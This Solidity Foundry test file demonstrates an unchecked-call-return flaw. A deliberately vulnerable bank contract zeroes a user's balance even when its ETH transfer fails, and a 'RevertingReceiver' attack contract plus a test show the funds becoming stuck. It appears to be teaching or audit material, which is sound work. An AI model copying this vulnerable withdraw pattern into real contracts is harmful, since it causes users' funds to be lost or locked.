pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable contract as provided
contract VulnerableSimpleBank {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint amount = balances[msg.sender];
        // Vulnerable: not verifying success of ETH transfer
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        // Regardless of transfer result, balance is reset
        balances[msg.sender] = 0;
    }
}

// Attack contract: RevertingReceiver
contract RevertingReceiver {
    VulnerableSimpleBank public bank;

    constructor(address _bankAddress) {
        bank = VulnerableSimpleBank(_bankAddress);
    }

    // Deposits ETH into the bank
    function attackDeposit() external payable {
        bank.deposit{value: msg.value}();
    }

    // Calls withdraw() on the bank
    function attackWithdraw() external {
        bank.withdraw();
    }

    // Fallback that reverts to simulate rejection of ETH
    fallback() external payable {
        revert("Reject ETH");
    }

    receive() external payable {
        revert("Reject ETH");
    }
}

// Foundry test contract that demonstrates the vulnerability
contract ImproperCheckOnTransferCreditTest is Test {
    VulnerableSimpleBank bank;
    RevertingReceiver attacker;

    // Set up the contracts
    function setUp() public {
        bank = new VulnerableSimpleBank();
        attacker = new RevertingReceiver(address(bank));
    }

    // Test that demonstrates the vulnerability:
    // 1. attacker deposits ETH into the bank
    // 2. attacker calls withdraw() which internally fails to transfer ETH
    //    (because of the revert in its fallback/receive) but still sets their balance to 0
    function testVulnerabilityExploit() public {
        // Fund the attacker contract with 1 ether
        vm.deal(address(attacker), 1 ether);
        
        // Perform deposit from attacker contract
        uint depositAmount = 1 ether;
        // Use a prank to simulate external call from attacker
        vm.prank(address(attacker));
        attacker.attackDeposit{value: depositAmount}();

        // Check that the bank internal balance mapping reflects the deposit
        uint internalBalance = bank.balances(address(attacker));
        assertEq(internalBalance, depositAmount, "Bank internal balance should equal depositAmount");

        // Check bank's actual ETH balance has increased
        assertEq(address(bank).balance, depositAmount, "Bank contract balance should equal depositAmount");

        // Now, attacker initiates withdraw
        // The low-level call to transfer ETH will fail due to the fallback reverting,
        // but the bank contract will still zero out the balance.
        vm.prank(address(attacker));
        attacker.attackWithdraw();

        // The internal bank balance for the attacker should now be 0, even though the transfer failed.
        uint postWithdrawBalance = bank.balances(address(attacker));
        assertEq(postWithdrawBalance, 0, "Bank internal balance should be 0 after withdrawal");

        // The attacker contract did not actually receive ETH due to its reverting fallback,
        // so its ETH balance should remain unchanged (or 0 if it had none initially)
        uint attackerEthBalance = address(attacker).balance;
        assertEq(attackerEthBalance, 0, "Attacker contract should not receive ETH on withdraw");

        // However, the bank contract still holds the ETH deposited since the transfer failed.
        assertEq(address(bank).balance, depositAmount, "Bank contract balance remains unchanged after failed transfer");
    }
}
